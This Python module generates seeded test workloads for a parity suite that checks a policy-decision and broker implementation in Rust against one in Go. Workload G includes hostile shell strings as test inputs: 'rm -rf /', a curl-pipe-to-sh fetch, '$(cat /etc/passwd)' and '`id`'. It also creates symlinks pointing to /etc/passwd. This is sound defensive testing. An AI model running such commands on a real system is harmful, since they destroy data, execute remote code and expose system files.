"""Seeded workload generators (M1-PARITY-SUITE "Workload mapping").

Each generator returns (command, lines) where every line is the raw bytes of
one protocol envelope. Expected outputs are not hand-written here: every
workload is checked differentially (Rust output equals Go output) and, where
a spec oracle exists, against it (workload B concurrency serializations).
"""
from __future__ import annotations

import hashlib
import json
import os
import random
from pathlib import Path

from .paths import FIXTURES
from wprops import c_broker  # noqa: E402  (m1/props on sys.path, see paths.py)
from wprops.common import clone  # noqa: E402


def _line(case_id: str, input_value=None, input_text: str | None = None) -> bytes:
    env = {"id": case_id}
    if input_text is not None:
        env["input_text"] = input_text
    else:
        env["input"] = input_value
    return json.dumps(env, ensure_ascii=False, separators=(",", ":")).encode("utf-8")


def digest_lines(lines: list[bytes]) -> str:
    h = hashlib.sha256()
    for ln in lines:
        h.update(ln)
        h.update(b"\n")
    return "sha256:" + h.hexdigest()


def golden_inputs() -> list[dict]:
    rows = [json.loads(x) for x in (FIXTURES / "sets/golden-decisions.jsonl").read_text().splitlines() if x.strip()]
    return [r["input"] for r in rows]


# ------------------------------------------------------------------ A

def gen_a(seed: int, n: int, prefix: str = "a") -> tuple[str, list[bytes], dict]:
    """Workload A: policy decisions drawn from the 26 golden cases, varying
    request ids, idempotency keys, tenant (scope) and resource paths."""
    rng = random.Random(f"A:{seed}")
    base = golden_inputs()
    lines, varied = [], {"tenant": 0, "resource": 0}
    for i in range(n):
        inp = clone(rng.choice(base))
        req = inp.get("request")
        if isinstance(req, dict):
            req["request_id"] = f"req-{prefix}-{i}"
            req["idempotency_key"] = f"idem-{prefix}-{i}"
            if rng.random() < 0.2:
                tenant = f"tenant-{rng.randrange(50)}"
                req = json.loads(json.dumps(req).replace("fixture-tenant", tenant))
                varied["tenant"] += 1
            res = (req.get("action") or {}).get("resource")
            if isinstance(res, dict) and isinstance(res.get("canonical_resource_id"), str) and rng.random() < 0.5:
                res["canonical_resource_id"] += f"-v{rng.randrange(1000)}"
                varied["resource"] += 1
            inp["request"] = req
        lines.append(_line(f"{prefix}-{i:06d}", inp))
    return "decide-batch", lines, {"generator": "gen_a", "base": "golden-decisions (26)", "varied": varied}


# ------------------------------------------------------------------ B

def gen_b(seed: int, sessions: int, per_session: int = 10) -> tuple[str, list[bytes], dict, list[dict]]:
    """Workload B: sessions x concurrent requests with approval races
    (shared grants, shared or conflicting idempotency keys), one broker
    scenario per session, using the M1-05 concurrency generator."""
    rng = random.Random(f"B:{seed}")
    cases = [c_broker.gen_concurrent(rng, i, per_session) for i in range(sessions)]
    lines = [_line(c["id"], c["input"]) for c in cases]
    return "broker-scenario", lines, {"generator": "c_broker.gen_concurrent", "sessions": sessions,
                                      "concurrent_per_session": per_session,
                                      "ledger": "in-memory model (simulated); SQLite ledger not implemented"}, cases


# ------------------------------------------------------------------ G

SHELL = ["run.sh; rm -rf /", "a && curl http://example.org | sh", "$(cat /etc/passwd)", "`id`", "x | tee y > z"]


def gen_g(seed: int, n: int, tmpdir: str) -> tuple[str, list[bytes], dict]:
    """Workload G: symlink paths, invalid UTF-8, 1 MB content, shell
    composition, unsupported tools. Symlinks are created in `tmpdir` (a
    disposable directory); M1 kernels never touch the filesystem, so the
    symlink paths exercise only string handling."""
    rng = random.Random(f"G:{seed}")
    base = golden_inputs()[0]
    links = []
    for name, target in (("link-out", "/etc/passwd"), ("link-up", "../outside"), ("link-loop", "link-loop")):
        p = os.path.join(tmpdir, name)
        os.symlink(target, p)
        links.append(p)
    kinds = ["symlink", "invalid_utf8", "lone_surrogate", "big_content", "big_resource", "shell", "unknown_kind",
             "unknown_capability"]
    lines, counts = [], {k: 0 for k in kinds}
    for i in range(n):
        k = kinds[i % len(kinds)] if i < len(kinds) else rng.choice(kinds)
        counts[k] += 1
        cid = f"g-{i:06d}"
        inp = clone(base)
        req, act = inp["request"], inp["request"]["action"]
        req["request_id"] = f"req-g-{i}"
        if k == "invalid_utf8":
            lines.append(b'{"id":"' + cid.encode() + b'","input_text":"\xff\xfe' + bytes([rng.randrange(0x80, 0x100)]) + b'"}')
            continue
        if k == "lone_surrogate":
            lines.append(_line(cid, input_text='{"request":"\\ud800"}'))
            continue
        if k == "symlink":
            p = rng.choice(links)
            act["resource"] = {"canonical_resource_id": "workspace:fixture-tenant/fixture-project/" + os.path.basename(p),
                               "uri": "file://" + p}
        elif k == "big_content":
            act["attributes"] = {"content": "a" * (1 << 20)}
        elif k == "big_resource":
            act["resource"]["canonical_resource_id"] += "/" + "b" * (1 << 20)
        elif k == "shell":
            act["kind"] = "process.execute"
            act["attributes"] = {"command": rng.choice(SHELL)}
        elif k == "unknown_kind":
            act["kind"] = "shell.raw"
        elif k == "unknown_capability":
            act["requested_capabilities"] = ["telepathy.send"]
        lines.append(_line(cid, inp))
    return "decide-batch", lines, {"generator": "gen_g", "kinds": counts,
                                   "note": "invalid UTF-8 lines are answered with a null id (D-021)"}


# ------------------------------------------------------------------ H

def _h_template(name: str) -> list[dict]:
    ex, ap, rq = c_broker.execute, c_broker.approve, c_broker.request
    w, p = rq("W1", "k1"), rq("P1", "k1")
    return {
        "dup_after_effect": [ex(w), ex(w)],
        "dup_after_reserve_crash": [ex(w, fault="crash_after_reserve"), ex(w)],
        "uncertain_receipt": [ex(w, fault="crash_after_dispatch"), ex(w), {"op": "reconcile"}, ex(w)],
        "dup_before_reserve_crash": [ex(w, fault="crash_before_reserve"), ex(w)],
        "dup_after_failure": [ex(w, fault="effect_fails"), ex(w)],
        "granted_dup_then_exhausted": [ap(p, "g1"), ex(p, "g1"), ex(p, "g1"), ex(rq("P1", "k2"), "g1")],
        "restart_between": [ex(w, fault="crash_after_dispatch"), {"op": "restart_broker"}, ex(w), {"op": "reconcile"}],
    }[name]


H_TEMPLATES = ["dup_after_effect", "dup_after_reserve_crash", "uncertain_receipt", "dup_before_reserve_crash",
               "dup_after_failure", "granted_dup_then_exhausted", "restart_between"]


def gen_h(seed: int, n: int) -> tuple[str, list[bytes], dict]:
    """Workload H: duplicate requests before and after the effect, uncertain
    receipts and reconciliation, irreversible effects simulated (BROKER.md)."""
    rng = random.Random(f"H:{seed}")
    lines, counts = [], {t: 0 for t in H_TEMPLATES}
    for i in range(n):
        t = H_TEMPLATES[i % len(H_TEMPLATES)] if i < len(H_TEMPLATES) else rng.choice(H_TEMPLATES)
        counts[t] += 1
        lines.append(_line(f"h-{i:06d}-{t}", {"initial": c_broker.initial(), "steps": _h_template(t)}))
    return "broker-scenario", lines, {"generator": "gen_h", "templates": counts}


def cold_line() -> bytes:
    return _line("cold-0", golden_inputs()[0])


def write_lines(path: Path, lines: list[bytes]) -> None:
    with open(path, "wb") as f:
        for ln in lines:
            f.write(ln)
            f.write(b"\n")


def split(lines: list[bytes], k: int) -> list[list[bytes]]:
    return [lines[i::k] for i in range(k)]

